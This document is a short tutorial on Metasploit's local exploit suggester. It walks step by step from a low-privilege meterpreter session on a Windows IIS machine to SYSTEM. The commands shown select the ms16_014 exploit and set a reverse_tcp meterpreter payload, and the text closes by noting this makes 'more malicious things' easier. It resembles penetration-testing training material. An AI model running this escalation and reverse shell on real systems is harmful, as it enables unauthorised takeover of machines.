This article will show how we can use Metaspoilt local suggester to get recommendation for privilege escalation after exploiting into the system.
Privilege escalation with Metaspoilt suggester module
### 1.	Scenario
-	The case is that you successfully exploit and get the meterpreter on the machine. However, you are just a normal user on the machine, not admin or system. You can know this by typing in:
getuid
 ![image](https://user-images.githubusercontent.com/112114250/223617857-5f8ea501-738b-4fa0-b663-8709a3d7fc2e.png)

-	This shows that you are just a user that owns the IIS service. 
### 2.	Using suggester module in Metaspoilt
-	In order to use another module after you already have a meterpreter, type in
background
 ![image](https://user-images.githubusercontent.com/112114250/223617894-26e93b5b-4e32-499f-84a1-d58645bc9927.png)

-	This will send the session to the background, so you can use another module
-	There is a module in Metaspoilt that can help us to find post exploitation based on our current session. Type in:
use post/multi/recon/local_exploit_suggester   
show options 
 ![image](https://user-images.githubusercontent.com/112114250/223617924-70823d28-0164-4550-b344-51de4702bcc2.png)

-	Here you will see that we need a session, type in:
sessions
 ![image](https://user-images.githubusercontent.com/112114250/223617935-6948865a-f5fb-4966-8c47-6fcdada61703.png)

-	You will see different sessions, look at the session that you want to do post exploitation and remember the session ID.
-	After that, type in:
set session <Session ID>
run
![image](https://user-images.githubusercontent.com/112114250/223617967-7c4f5945-6cf0-4938-8d03-24c334c71c4d.png)

-	It will run for a while to find some exploits.
 
-	We found some exploits that we can use. We can run through all of them too see which one is valid. In this case, I will choose the ms16_014_wmi_recv_notif. Type in: 
use <the exploit module you want>
show options
 ![image](https://user-images.githubusercontent.com/112114250/223618029-49737fee-4bec-4ece-9312-18311c3c6b30.png)

-	Here we just need the session, type in:
set session <Session ID>
set payload windows/x64/meterpreter/reverse_tcp 
run
 ![image](https://user-images.githubusercontent.com/112114250/223618054-9c2f2e0f-d918-4e78-85ea-2fa5026b1935.png)

-	We get a shell back! Now type in getuid to see who we are.
 ![image](https://user-images.githubusercontent.com/112114250/223618073-1d9bc27a-b642-4254-80d8-dfa3f603a6f5.png)

-	We are system now, so it is easier to do more malicious things.
